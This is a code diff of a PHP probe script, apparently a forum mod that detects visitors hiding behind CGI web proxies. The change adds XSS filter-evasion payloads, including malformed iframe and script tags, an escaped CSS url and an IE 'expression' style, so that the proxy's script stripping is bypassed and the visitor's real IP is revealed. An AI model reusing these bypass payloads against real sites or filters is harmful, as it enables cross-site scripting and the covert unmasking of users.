@@ -703,7 +703,7 @@ switch ($mode)
 		$orig_url = request_var('url', '');
 		$javascript_url = $server_url."probe.$phpEx?mode=xss&ip=$orig_ip&extra=$sid,$key";
 		$iframe_url = htmlspecialchars($javascript_url);
-		$iframe_src = $iframe_url . !empty($orig_url) ? "&amp;url=$orig_url" : '';
+		$script_url = $server_url . 'xss.js';
 		// -moz-binding only works in FireFox (and browsers using the gecko rendering engine?), and "expression" works only in IE.
 		// Glype currently strips out the ending letter "l" from "xss.xml" causing a 404 request for "xss.xm", so the extra backslash
 		// between 'xss.xml' and '#xss' is a workaround.
@@ -713,15 +713,10 @@ switch ($mode)
 ?>
 <html><head><title></title></head>
 <body>
-<iframe id="xss_probe" src="<?php echo $iframe_src; ?>" url="<?php echo $iframe_url; ?>" width="1" height="1" frameborder="0"></iframe>
-
-<?php //This basic js is a backup plan, in case none of the "quirks" to follow will work, and if the CGI-proxy is not removing scripts ?>
-<script type="text/javascript">
-var xssObj = document.getElementById("xss_probe");
-xssObj.src = "<?php echo $javascript_url; ?>&url="+escape(location.href);
-</script>
-
 <?php // Quirks - some quirky-sneaky stuff >:) ?>
+<<iframe/src="<?php echo $iframe_url; ?>" id="xss_probe" url="<?php echo $iframe_url; ?>" width="1" height="1" frameborder="0"></iframe>
+<<SCRIPT a="'></SCRIPT>script "/SRC="<?php echo $script_url; ?>"></script>
+<div style="background-image:\u\r\l('<?php echo $iframe_url; ?>')"></div>
 <!--[if IE]>
 <xss style="xss:expr/**/ession(if(this.x!='x'){document.getElementById('xss_probe').sr/**/c='<?php echo $iframe_url; ?>';this.x='x';})" x=""></xss>
 <![endif]-->
